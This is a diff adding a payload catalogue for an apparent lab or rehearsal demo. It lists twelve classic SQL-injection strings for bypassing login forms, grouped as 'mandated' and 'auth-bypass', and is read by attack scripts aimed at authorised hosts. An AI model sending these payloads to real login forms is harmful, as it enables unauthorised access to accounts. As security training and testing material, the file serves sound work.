@@ -1,0 +1,24 @@
+# HDD HK1 demo payload catalogue (lab/rehearsal only).
+#
+# Tab-separated, one payload per line: id <TAB> group <TAB> payload
+#   M1..M6  the six mandated SQL-injection payloads (docs/SPEC.md C4.1 / E1.1)
+#   B1..B6  the six auth-bypass forms named in docs/COLLAB.md (HK1 assignment)
+#
+# This file is read by lab/demo/attack.ps1 and lab/demo/attack.sh, and parsed by
+# scripts/test/*.test.mjs which checks the mandated values against docs/SPEC.md.
+# Do not add other attack classes here: the demo only covers SQL injection on a
+# login form and only targets operator-authorised hosts (targets.allow).
+# Payloads must not contain tab or newline characters (one per line).
+# The payloads are sent exactly as written, including spacing.
+M1	mandated	' OR 1=1--
+M2	mandated	' OR '1'='1
+M3	mandated	admin' --
+M4	mandated	admin' #
+M5	mandated	admin'/*
+M6	mandated	' or 1=1 LIMIT 1 --
+B1	auth-bypass	admin'--
+B2	auth-bypass	admin' or '1'='1
+B3	auth-bypass	admin') or ('1'='1
+B4	auth-bypass	' or 1=1#
+B5	auth-bypass	" or ""="
+B6	auth-bypass	admin'/*
